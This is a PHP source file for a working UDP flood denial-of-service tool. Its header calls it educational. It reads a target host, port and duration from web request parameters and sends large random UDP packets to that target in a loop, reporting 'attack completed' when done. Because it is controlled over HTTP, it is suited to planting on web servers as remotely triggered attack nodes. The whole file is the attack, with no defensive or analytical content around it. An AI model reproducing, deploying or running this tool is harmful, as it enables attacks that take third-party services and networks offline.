<?php

/**
 *
 * Script to perform a DoS UDP Flood
 *
 * @author c0re^
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
 *
 * This tool is written on educational purpose, please use it on your own good faith.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 */

error_reporting(E_ERROR | E_WARNING);

ini_set('max_execution_time', 0);

class DoS
{
    const MIN_PACKET_SIZE = 61440; // 60 kB
    const MAX_PACKET_SIZE = 71680; // 70 kB

    /**
     * Target host, e.g. 127.0.0.1 or google.com
     * @var string
     */
    private $host;

    /**
     * Target port, e.g. 443
     * @var int
     */
    private $port;

    /**
     * Flood time in seconds
     * @var int
     */
    private $time;

    /**
     * Randomize all packets to avoid packet drops
     * @var boolean
     */
    private $random;

    /**
     * DoS constructor.
     * @param $host string target host
     * @param $port int target port
     * @param $time int flood time in Seconds
     * @param $random boolean randomize all packets to avoid packet drops
     */
    public function __construct($host, $port, $time, $random)
    {
        Preconditions::checkArgument(strlen($host), "host parameter missing or has an incorrect format");
        Preconditions::checkArgument(is_numeric($port), "port parameter missing or has an incorrect format");
        Preconditions::checkArgument(is_numeric($time), "time parameter missing or has an incorrect format");
        Preconditions::checkArgument(is_bool($random), "random parameter missing or has an incorrect format");

        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->random = $random;
    }

    /**
     * Starts an UDP attack
     * @throws Exception on socket error
     */
    public function flood()
    {
        // open socket connection
        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
        if (!$socket) {
            throw new Exception($errorMessage);
        }

        // generate random packet
        $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
        $packet = Random::string($length);

        // write packets to stream
        $endTime = time() + $this->time;
        while (time() <= $endTime) {
            @fwrite($socket, $this->random ? str_shuffle($packet) : $packet);
        }

        // close socket connection
        @fclose($socket);
    }
}

class Random
{
    /**
     * Creates a random string whose length is the number of characters specified.
     * @param $length int length of the random string
     * @return string the random string
     */
    public static function string($length)
    {
        // openssl_random_pseudo_bytes is the fastest way to generate a random string
        if (function_exists("openssl_random_pseudo_bytes")) {
            return bin2hex(openssl_random_pseudo_bytes($length / 2));
        } else {
            return str_shuffle(substr(str_repeat(md5(mt_rand()), 2 + $length / 32), 0, $length));
        }
    }
}

class Preconditions
{
    /**
     * Ensures the truth of an expression involving one or more parameters to the calling method.
     * @param $expression boolean a boolean expression
     * @param $errorMessage string the exception message to use if the check fails
     * @throws InvalidArgumentException if expression is false
     */
    public static function checkArgument($expression, $errorMessage)
    {
        if (!$expression) {
            throw new InvalidArgumentException($errorMessage);
        }
    }
}

class Application
{
    public static function start($args)
    {
        if (sizeof($args) === 0) {
            echo json_encode(array("status" => "ok"));
            return;
        }

        $host = $args['host'];
        $port = isset($args['port']) ? $args['port'] : 80;
        $time = isset($args['time']) ? $args['time'] : 60;
        $random = isset($args['random']) ? $args['random'] === "true" : false;

        try {
            (new DoS($host, $port, $time, $random))->flood();
            echo json_encode(array("status" => "attack completed"));
        } catch (Exception $e) {
            echo json_encode(array("status" => "attack failed", "error" => $e->getMessage()));
        }
    }
}

Application::start($_POST ? $_POST : $_GET);
